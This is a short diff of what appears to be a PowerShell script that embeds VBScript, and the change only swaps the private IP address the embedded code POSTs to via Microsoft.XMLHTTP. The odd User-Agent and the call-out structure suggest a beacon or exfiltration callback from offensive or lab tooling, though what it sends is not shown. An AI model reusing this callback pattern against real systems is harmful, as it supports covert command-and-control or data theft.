@@ -1,6 +1,6 @@
 ﻿$script = @"
 Set objHTTP = CreateObject("Microsoft.XMLHTTP")
-objHTTP.open "POST", "http://172.16.202.130/", False
+objHTTP.open "POST", "http://192.168.188.132/", False
 
 objHTTP.setRequestHeader "User-Agent", "DoYouEven-TF12-Bro?"
 
